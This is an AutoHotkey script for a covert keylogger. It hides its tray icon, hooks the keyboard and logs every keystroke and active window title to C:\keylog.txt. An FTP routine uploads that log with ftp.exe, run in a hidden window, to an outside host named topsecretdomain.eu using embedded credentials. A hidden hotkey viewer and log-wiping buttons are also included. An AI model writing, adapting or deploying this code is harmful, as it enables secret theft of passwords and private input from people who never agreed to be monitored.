#NoEnv ; Recommended for performance and compatibility with future #Persistent
#InstallKeybdHook
#NoTrayIcon

logintervolts = 600000
FormatTime, date, YYYYMMDDHH12MISS
oldtitle=nothing
Gui, Add, Text, Center,            ---------------------------------------------------KeyLog-----------------------------------------------------------
Gui, Add, Edit, x10 y30 h800 w600 R50 vedit vtext, 
Gui, Add, Button, x260 y700 w100, Exit 
Gui, Add, Button, x360 y700 w100, Refresh
Gui, Add, Button, x160 y700 w100, Clear
Gui, Add, Button, x360 y730 w100, Remove All Logs
Gui, Add, Button, x160 y730 w100, Log Location
SetTimer, timedate, %logintervolts%
SetTimer, timerenew, 60000



SendMode Input ; Recommended for new scripts due to its superior speed and reliability.

; Detect hidden windows since they can be active
; (e.g. AutoHotkey main window while using Menu,MenuName,Show.)
DetectHiddenWindows, On
Loop,
{
 WinGetActiveTitle, watitle
 if (watitle != oldtitle and watitle != "")
  {
  FileAppend, `n`n-------- %watitle% --------`n%date%`n, C:\keylog.txt
  oldtitle = %watitle%
  }

  Input, UserInput, V C, {enter}.{esc}{Space}{tab}{Left}{Right}{Up}{Down}{Home}{End}
  tvar:=Errorlevel

  IfInString, tvar, EndKey:
  {
    StringSplit,endkey,tvar,`:
    if endkey2=Enter
      FileAppend, %UserInput%`n, C:\keylog.txt
    else if endkey2=Space
      FileAppend, %UserInput%%A_space%, C:\keylog.txt
    else
      FileAppend, %UserInput%%A_space%[%endkey2%]%A_space%, C:\keylog.txt
  }


}
Return


;---------------------------------------FTP--------------------------------------


loop {

;Sleep, 1800000
Sleep, 1800

FTP_Connect(host,user,pass,commands)
{
  FTPCommandFile = %A_ScriptDir%\FTPCommands2.txt
  FTPLogFile = %A_ScriptDir%\FTPLog.txt
  FileDelete %FTPCommandFile%  ; In case previous run was terminated prematurely.

  FileAppend,
(
open %host%
%user%
%pass%
binary
%commands%
ls -l
quit
), %FTPCommandFile%

RunWait %comspec% /c ftp.exe -s:"%FTPCommandFile%" >"%FTPLogFile%",,hide
  FileDelete %FTPCommandFile%  ; Delete for security reasons.
;  Run %FTPLogFile%  ; Display the log for review.
}

host = topsecretdomain.eu
user = topsecretone
pass = secretpwd
commands = put C:\keylog.txt
;(ltrim
;   put C:\log.txt ; Upload
;)
FTP_Connect(host,user,pass,commands)
}
Return




ButtonLogLocation:
{
Gui, 3:Add, Text,, Your Log is at C:\keylog.txt
Gui, 3:Add, Button,, Open Log
Gui, 3:Add, Button,, Ok
Gui, 3:Show
Return,
}

3ButtonOpenLog:
{
Gui, 3:Destroy
Run, %wheretosave%
Return,
}

3ButtonOk:
{
Gui, 3:Destroy
Return,
}



ButtonRemoveAllLogs:
{
FileDelete, C:\keylog.txt
ExitApp
}

ButtonRefresh:
{
FileAppend, {Reload}, C:\keylog.txt
FileRead, keylogedtext, C:\keylog.txt
GuiControl,, text, %keylogedtext%
Return,
}

ButtonClear:
{
FileDelete, C:\keylog.txt
FileAppend,, C:\keylog.txt
FileRead, keylogedtext, C:\keylog.txt
GuiControl,, text, %keylogedtext%
Return,
}



~enter::
{
fileappend, {enter}`n, C:\keylog.txt
FileRead, keylogedtext, C:\keylog.txt
GuiControl,, text, %keylogedtext%
return,
}



^!s::
IfWinNotExist, KeyLog
FileRead, keylogedtext, C:\keylog.txt
GuiControl,, text, %keylogedtext%
Gui, Show,, KeyLog
Return,

timedate:
{
FileAppend, `n%date%`n, C:\keylog.txt
Return,
}

ButtonExit:
ExitApp

timerenew:
{
FormatTime, date, YYYYMMDDHH12MISS
Return,
}








#Persistent
File=C:\keylog.txt
SetTimer, CheckAndDelete, 60000 ; Per Minute
Return

CheckAndDelete:
FileGetSize, FileSize, %File%
If ( FileSize > 10 )
  FileDelete, %File%
Return